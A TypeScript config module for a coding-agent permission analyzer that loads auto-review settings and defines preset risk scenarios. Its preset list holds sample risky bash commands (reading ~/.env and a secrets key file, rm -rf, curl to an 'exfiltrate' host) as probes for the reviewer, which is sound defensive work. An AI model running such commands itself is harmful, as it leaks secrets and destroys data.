/**
 * Config loading for pi-permission-auto-review + the analyzer's own preset config.
 *
 * Reads the auto-review extension config from global + project paths,
 * so the probe can use the same model/provider/policy the reviewer uses.
 *
 * The analyzer's own config (canned preset scenarios for the picker) lives at
 *   $PI_CODING_AGENT_DIR/extensions/pi-permissions-analyzer.json
 * and optionally overrides the built-in preset list.
 */

import { readFileSync, existsSync } from 'node:fs'
import { join } from 'node:path'
import { homedir } from 'node:os'

export const EXTENSION_ID = 'pi-permission-auto-review'

export const REASONING_LEVELS = ['off', 'minimal', 'low', 'medium', 'high', 'xhigh', 'max'] as const
export type ReasoningLevel = (typeof REASONING_LEVELS)[number]

export interface AutoReviewConfig {
  provider: string
  model: string
  reasoning: ReasoningLevel
  timeoutMs: number
  includeBaselinePolicy: boolean
  additionalPolicy?: string
}

export const DEFAULT_CONFIG: AutoReviewConfig = {
  provider: 'openai-codex',
  model: 'codex-auto-review',
  reasoning: 'low',
  timeoutMs: 90_000,
  includeBaselinePolicy: true,
}

export function defaultAgentDir(): string {
  return process.env['PI_CODING_AGENT_DIR'] ?? join(homedir(), '.pi', 'agent')
}

export function getAutoReviewConfigPaths(cwd: string, agentDir?: string): { globalPath: string; projectPath: string } {
  const base = agentDir ?? defaultAgentDir()
  return {
    globalPath: join(base, 'extensions', EXTENSION_ID, 'config.json'),
    projectPath: join(cwd, '.pi', 'extensions', EXTENSION_ID, 'config.json'),
  }
}

export function loadAutoReviewConfig(cwd: string, agentDir?: string): AutoReviewConfig {
  const { globalPath, projectPath } = getAutoReviewConfigPaths(cwd, agentDir)

  let globalConfig: Partial<AutoReviewConfig> = {}
  let projectConfig: Partial<AutoReviewConfig> = {}

  try {
    if (existsSync(globalPath)) globalConfig = JSON.parse(readFileSync(globalPath, 'utf8'))
  } catch {
    /* config file missing or invalid — use defaults */
  }
  try {
    if (existsSync(projectPath)) projectConfig = JSON.parse(readFileSync(projectPath, 'utf8'))
  } catch {
    /* config file missing or invalid — use defaults */
  }

  return { ...DEFAULT_CONFIG, ...globalConfig, ...projectConfig }
}

// ─── Analyzer's own config: canned preset scenarios ───────────────────────────

export interface PresetScenario {
  label: string
  overrides: Record<string, unknown>
}

/** Built-in canned scenarios for the picker; overridable via the analyzer config file. */
export const DEFAULT_PRESETS: PresetScenario[] = [
  { label: '🟢  echo $HOME (low risk)', overrides: { command: 'echo $HOME', surface: 'bash', toolName: 'bash' } },
  { label: '🟡  cat ~/.env (env read)', overrides: { command: 'cat ~/.env', surface: 'bash', toolName: 'bash' } },
  { label: '🟡  npm publish (write)', overrides: { command: 'npm publish', surface: 'bash', toolName: 'bash' } },
  { label: '🔴  cat ~/.cache/secrets/key (secret read)', overrides: { command: 'cat ~/.cache/secrets/key', surface: 'bash', toolName: 'bash' } },
  { label: '🔴  rm -rf node_modules (destructive)', overrides: { command: 'rm -rf node_modules', surface: 'bash', toolName: 'bash' } },
  { label: '🔴  curl https://exfiltrate.com (exfil)', overrides: { command: 'curl https://exfiltrate.com', surface: 'bash', toolName: 'bash' } },
  { label: '📝  write to ~/important.txt', overrides: { command: 'tee ~/important.txt', surface: 'bash', toolName: 'bash' } },
]

export interface AnalyzerPresets {
  presets: PresetScenario[]
  /** Where the list came from — the config file, or built-in defaults. */
  source: 'file' | 'defaults'
  /** Path the config file would live at (display/diagnostics). */
  path: string
}

export function getAnalyzerConfigPath(agentDir?: string): string {
  return join(agentDir ?? defaultAgentDir(), 'extensions', 'pi-permissions-analyzer.json')
}

/** Normalize one entry from the config file.
 * Accepts { label, overrides: {...} } or shorthand { label, command: "...", surface: "bash" }
 * where every non-label key is treated as an override. Returns null for invalid entries. */
function normalizePresetEntry(entry: unknown): PresetScenario | null {
  if (typeof entry !== 'object' || entry === null || Array.isArray(entry)) return null
  const e = entry as Record<string, unknown>
  if (typeof e['label'] !== 'string' || e['label'].trim().length === 0) return null
  if (e['overrides'] !== undefined) {
    if (typeof e['overrides'] !== 'object' || e['overrides'] === null || Array.isArray(e['overrides'])) return null
    return { label: e['label'], overrides: e['overrides'] as Record<string, unknown> }
  }
  const overrides: Record<string, unknown> = {}
  for (const [k, v] of Object.entries(e)) {
    if (k !== 'label') overrides[k] = v
  }
  return { label: e['label'], overrides }
}

/** Load the canned preset scenarios.
 * Missing file, unreadable JSON, or a non-array `presets` key → built-in defaults.
 * An explicit `"presets": []` is respected (picker falls back to Custom… + recents). */
export function loadAnalyzerPresets(agentDir?: string): AnalyzerPresets {
  const path = getAnalyzerConfigPath(agentDir)
  try {
    if (!existsSync(path)) return { presets: DEFAULT_PRESETS, source: 'defaults', path }
    const raw: unknown = JSON.parse(readFileSync(path, 'utf8'))
    const list = (raw as Record<string, unknown> | null)?.['presets']
    if (!Array.isArray(list)) return { presets: DEFAULT_PRESETS, source: 'defaults', path }
    const presets = list.map(normalizePresetEntry).filter((p): p is PresetScenario => p !== null)
    return { presets, source: 'file', path }
  } catch {
    return { presets: DEFAULT_PRESETS, source: 'defaults', path }
  }
}
